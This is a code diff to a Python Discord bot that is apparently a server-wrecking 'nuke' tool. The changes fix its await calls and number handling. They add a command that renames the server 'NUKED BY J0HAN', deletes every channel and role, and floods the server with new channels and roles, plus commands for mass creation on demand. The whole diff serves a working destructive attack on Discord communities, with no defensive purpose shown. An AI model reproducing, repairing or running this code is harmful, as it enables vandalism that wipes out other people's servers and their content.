@@ -54,11 +54,7 @@ async def on_message(message):
     async def mass_channels(amount, channel_name):
         print(Fore.WHITE + "\nMass channel creation is in progress...")
         channels_made = 0
-        if auto == False:
-            command = msg.split(" ")
-            amount = command[1]
-            channel_name = command[2]
-        while channels_made < amount:
+        while int(channels_made) < int(amount):
             try:
                 await message.guild.create_text_channel(channel_name)
                 channels_made += 1
@@ -71,11 +67,7 @@ async def on_message(message):
     async def mass_roles(amount, role_name):
         print(Fore.WHITE + "\nMass role creation is in progress...")
         roles_made = 0
-        if auto == False:
-            command = msg.split(" ")
-            amount = command[1]
-            role_name = command[2]
-        while roles_made < amount:
+        while int(roles_made) < int(amount):
             try:
                 await message.guild.create_role(name=role_name)
                 roles_made += 1
@@ -85,26 +77,31 @@ async def on_message(message):
                 await asyncio.sleep(0.3)
         print(Fore.WHITE + "Mass role creation has been finished!")
 
-    auto = False
-
     if msg.startswith(f"{prefix}nuke"):
+        await message.guild.edit(name="NUKED BY J0HAN")
         await del_channels()
         await del_roles()
-        auto = True
         await mass_channels(5, "johan-was-here")
         await mass_roles(5, "J0HAN WAS HERE")
-        auto = False
         print(Fore.GREEN + "\nNuke has been finished!")
 
     if msg.startswith(f"{prefix}del"):
-        del_channels()
-        del_roles()
+        await del_channels()
+        await del_roles()
         print(Fore.GREEN + "Deletion of channels & roles has been complete!")
     
     if msg.startswith(f"{prefix}cdel"):
-        del_channels()
+        await del_channels()
 
     if msg.startswith(f"{prefix}rdel"):
-        del_roles()
+        await del_roles()
+
+    if msg.startswith(f"{prefix}channels"):
+        command = msg.split(" ")
+        await mass_channels(command[1], command[2])
+
+    if msg.startswith(f"{prefix}roles"):
+        command = msg.split(" ")
+        await mass_roles(command[1], command[2])
 
 client.run(token)
